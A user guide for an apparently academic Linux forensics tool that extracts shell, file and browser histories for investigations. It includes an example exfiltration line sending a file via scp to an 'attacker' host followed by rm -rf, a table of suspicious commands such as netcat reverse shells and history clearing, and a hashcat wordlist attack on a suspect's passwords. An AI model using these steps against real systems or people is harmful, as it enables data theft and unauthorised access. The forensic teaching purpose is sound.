# HisLiLogger — User Guide

**Tool:** HisLiLogger — Linux-based Typed Commands History Logger and Extractor
**Course:** CY-2002/3006 Digital Forensics
**Version:** 1.0.0

---

## Table of Contents

1. [Introduction to Tool and Forensic Domain](#1-introduction)
2. [Legal and Ethical Considerations](#2-legal--ethical-considerations)
3. [System Requirements](#3-system-requirements)
4. [Installation Steps](#4-installation-steps)
5. [Step-by-Step Usage Instructions](#5-step-by-step-usage)
6. [Example Cases with Screenshots](#6-example-cases)
7. [Interpretation of Results](#7-interpretation-of-results)
8. [Work Division of Members](#8-work-division)

---

## 1. Introduction

### What is HisLiLogger?

HisLiLogger (History Linux Logger) is a Linux-based digital forensics tool designed to extract, aggregate, and analyze the activity history left behind by a user on a Linux system. It targets multiple artifact sources:

- **Shell command histories** — Every typed terminal command is often stored in history files such as `.bash_history`, `.zsh_history`, and fish's history database.
- **Recently used files** — GNOME-based desktops maintain an XML-based file (`.local/share/recently-used.xbel`) that records files opened via GUI applications.
- **Browser histories** — Firefox, Chromium, Chrome, and Brave all store browsing history in SQLite databases within the user's home directory.

All of these artifacts together form a rich profile of user activity — critical information in a forensic investigation.

### Forensic Domain: User Activity Reconstruction

User activity reconstruction is a key discipline in digital forensics. When investigating incidents such as insider threats, data exfiltration, system compromise, or policy violation, a forensic investigator must determine:

- What commands did the user execute?
- What files did they access?
- What websites did they visit?
- What keywords appear repeatedly in their activity? (possible indicators of intent)

HisLiLogger automates this reconstruction process, presenting findings in an organized GUI and exporting forensics-grade reports with SHA-256 file integrity hashes for chain-of-custody documentation.

---

## 2. Legal & Ethical Considerations

> **This section is mandatory per CLO 1 of the course.**

### Legal Framework

The use of this tool — or any digital forensics tool — must comply with applicable laws and regulations:

| Law / Standard | Relevance |
|---|---|
| **Computer Fraud and Abuse Act (CFAA)** | Unauthorized access to computer systems is illegal. This tool must only be used on systems where you have explicit authorization. |
| **Electronic Communications Privacy Act (ECPA)** | Intercepting or accessing stored communications without authorization is a federal offense. |
| **GDPR (EU) / PDPA (Pakistan)** | Personal browsing and command data is personally identifiable information (PII). It must be handled with strict access controls. |
| **ISO/IEC 27037** | International standard for digital evidence identification, collection, acquisition, and preservation. |
| **NIST SP 800-86** | Guide to integrating forensic techniques into incident response. |

### Ethical Obligations

1. **Authorized Use Only** — Never run HisLiLogger on a system or user account without written authorization from the system owner or a court order.
2. **Data Privacy** — Extracted history data is sensitive. Restrict access to authorized investigators only.
3. **Evidence Integrity** — The tool computes SHA-256 hashes of all source files at the time of extraction. These hashes must be recorded and preserved to demonstrate that evidence was not tampered with (chain of custody).
4. **Minimal Footprint** — The tool reads data in read-only mode and copies SQLite databases to temp files before querying — it does not modify the original evidence.
5. **Non-Disclosure** — Investigation results must not be disclosed to unauthorized parties.
6. **Academic Context** — In this project context, the tool is tested only on your own system or forensic images obtained from NIST CFREDS. It must not be used to access another student's or person's data.

### Chain of Custody

HisLiLogger records SHA-256 hashes of every source file at extraction time, which appears in the Forensic Log tab and Forensic Report export. This provides a cryptographic record that the source files were not modified during or after extraction.

---

## 3. System Requirements

### Minimum Requirements

| Component | Requirement |
|---|---|
| Operating System | Linux (Ubuntu 20.04+, Fedora 35+, Debian 10+, Arch, Kali) |
| Python | 3.8 or higher |
| RAM | 256 MB minimum |
| Disk Space | 10 MB for tool; export files vary by history size |
| Display | GUI required (X11 or Wayland) |

### Required Python Modules

All modules are part of Python's **standard library** — no external packages required:

| Module | Purpose |
|---|---|
| `tkinter` | GUI framework |
| `sqlite3` | Reading browser history databases |
| `xml.etree.ElementTree` | Parsing recently-used.xbel |
| `hashlib` | SHA-256 integrity hashing |
| `threading` | Non-blocking background extraction |
| `pathlib` | Cross-platform path handling |
| `shutil`, `tempfile` | Safe database copying |
| `collections.Counter` | Keyword frequency counting |
| `re` | Token extraction for keyword builder |

---

## 4. Installation Steps

### Step 1 — Verify Python Installation

```bash
python3 --version
# Expected: Python 3.8.x or higher
```

### Step 2 — Install tkinter (if missing)

On minimal Ubuntu/Debian installations, tkinter may not be pre-installed:

```bash
sudo apt update
sudo apt install python3-tk
```

On Fedora:
```bash
sudo dnf install python3-tkinter
```

On Arch:
```bash
sudo pacman -S tk
```

### Step 3 — Download the Tool

```bash
# Option A: Git clone
git clone https://github.com/yourgroup/HisLiLogger.git
cd HisLiLogger

# Option B: Copy from USB or shared folder
cp -r /media/usb/HisLiLogger ~/HisLiLogger
cd ~/HisLiLogger
```

### Step 4 — Make Executable (Optional)

```bash
chmod +x hislilogger.py
```

### Step 5 — Launch

```bash
python3 hislilogger.py
```

The GUI window will appear within 1–2 seconds.

---

## 5. Step-by-Step Usage Instructions

### Interface Overview

The tool has four main sections:
- **Configuration Bar** (top) — Set target directory and keyword parameters
- **Tab Panel** — Shell History / Recently Used / Browser History / Keyword Dictionary / Forensic Log
- **Status Bar** — Shows current extraction status
- **Export Bar** (bottom) — Export buttons for various report types

---

### Step 1: Set the Target Home Directory

By default, the tool targets your own home directory (`~`). For forensic analysis of another user's account or a forensic disk image:

1. Click the **Browse** button next to "Target Home Dir"
2. Navigate to the user's home directory (e.g., `/mnt/forensic_image/home/suspect/`)
3. Click **OK**

> **Note:** You must have read permissions on the target directory.

---

### Step 2: Set Minimum Keyword Length

The default minimum keyword length is **3 characters**. Increase this to reduce noise (e.g., set to 5 to exclude short tokens).

---

### Step 3: Click EXTRACT ALL

Click the green **▶ EXTRACT ALL** button. The tool will:

1. Scan all shell history files
2. Parse the recently-used.xbel file
3. Copy and read all browser SQLite databases
4. Build the keyword dictionary
5. Update all tabs automatically

A progress message appears in the status bar. Extraction is typically complete in under 5 seconds.

---

### Step 4: Review the Shell History Tab

Columns:
- **Shell** — Which history file (e.g., `.bash_history`)
- **Line** — Line number in the file
- **Command** — The full command typed
- **Source** — Absolute path to the history file

Right-click any row to copy it to clipboard.

---

### Step 5: Review the Recently Used Tab

Shows files opened via GUI applications. Columns:
- **Filename** — Name of the file accessed
- **MIME** — File type (e.g., `application/pdf`)
- **Last Visited** — Timestamp of last access
- **URI** — Full file path as a URI

---

### Step 6: Review the Browser History Tab

Shows URLs visited in Firefox, Chrome, Chromium, or Brave. Columns:
- **Browser** — Which browser
- **Title** — Page title
- **Visits** — Number of times visited
- **Last Visit** — Most recent visit timestamp
- **URL** — Full URL

---

### Step 7: Review the Keyword Dictionary Tab

Shows all extracted keywords sorted by frequency. Useful for identifying patterns, interests, or targets. Columns:
- **Keyword** — The word/token
- **Count** — How many times it appeared across all sources
- **Length** — Character length

---

### Step 8: Export Results

Use the buttons in the bottom export bar:

| Button | Output |
|---|---|
| Export Shell History (.txt) | Shell commands only |
| Export Browser History (.txt) | Browser URLs only |
| Export ALL (.txt) | All sources combined |
| Export Keyword Dictionary | Frequency-sorted word list |
| Export Forensic Report | Full report with SHA-256 hashes |

---

## 6. Example Cases

### Case 1: Investigating Insider Data Exfiltration

**Scenario:** An employee is suspected of exfiltrating company files.

**Steps:**
1. Mount the suspect's disk image on your forensic workstation
2. Launch HisLiLogger and set the Target Home Dir to the mounted image's home
3. Click EXTRACT ALL
4. In **Shell History**, search for commands like `cp`, `scp`, `rsync`, `curl`, `wget`
5. In **Browser History**, look for file-sharing sites (Dropbox, Google Drive, Mega.nz)
6. Export the Forensic Report and record the SHA-256 hashes for court documentation

**Finding Example:**
```
[.bash_history:142] scp /home/alice/confidential.pdf attacker@192.168.1.55:/tmp/
[.bash_history:143] rm -rf /home/alice/confidential.pdf
```
This suggests file transfer to an external machine and subsequent deletion — strong indicators of exfiltration.

---

### Case 2: Building a Password Dictionary

**Scenario:** You need to perform dictionary-based password recovery and want to generate candidate words from the suspect's activity.

**Steps:**
1. Run HisLiLogger on the suspect's home directory
2. Go to the **Keyword Dictionary** tab
3. Review high-frequency terms — people often use variations of familiar words as passwords
4. Export the keyword dictionary
5. Use the exported file with tools like `hashcat` or `john`:
```bash
hashcat -a 0 -m 0 hash.txt keywords.txt
```

---

### Case 3: Timeline Reconstruction

**Scenario:** Determine what a suspect was doing on a specific date.

**Steps:**
1. Extract all history
2. In **Browser History**, sort by "Last Visit" column
3. Filter for the date in question
4. Cross-reference with **Recently Used Files** timestamps
5. Export the full report

---

## 7. Interpretation of Results

### Shell History Forensic Relevance

| Command Pattern | Forensic Significance |
|---|---|
| `sudo`, `su` | Privilege escalation attempts |
| `rm -rf` | File deletion — possible evidence destruction |
| `scp`, `rsync`, `ftp` | File transfer to/from remote hosts |
| `wget`, `curl` | File downloads — may indicate malware download |
| `nc`, `ncat`, `netcat` | Network connections — possible reverse shells |
| `history -c` | Clearing history — anti-forensic activity |
| `shred`, `wipe` | Secure deletion — anti-forensic |
| `crontab -e` | Persistence mechanism |

### Browser History Forensic Relevance

- Timestamps reveal when a user was active
- Repeated visits to certain sites indicate interest/intent
- File-sharing URLs may indicate exfiltration routes
- Search engine queries reveal user intent

### Keyword Dictionary Forensic Relevance

- High-frequency keywords indicate topics of interest
- Unusual technical terms may indicate skill level
- Domain names, IP addresses, or usernames extracted from commands can identify targets or accomplices

### SHA-256 Hashes (Chain of Custody)

Every source file's SHA-256 hash is recorded at extraction time. Before presenting evidence, re-hash the file:

```bash
sha256sum ~/.bash_history
```

If the hash matches the one recorded in the Forensic Log, the file has not been modified since extraction — maintaining evidentiary integrity.

---

## 8. Work Division

| Member | Contributions |
|---|---|
| Member 1 | `ShellHistoryExtractor` class, GUI Shell History tab, Status bar logic |
| Member 2 | `BrowserHistoryExtractor` class (Firefox + Chrome), GUI Browser tab |
| Member 3 | `RecentlyUsedExtractor` class, GUI Recently Used tab, `KeywordDictionaryBuilder` |
| Member 4 | GUI design and styling, export functions (TXT/Report), Forensic Log tab, README and User Guide |

> All members contributed to testing, integration, and demonstration preparation.

---

*HisLiLogger v1.0 — CY-2002/3006 Digital Forensics*
*For academic and authorized forensic use only.*
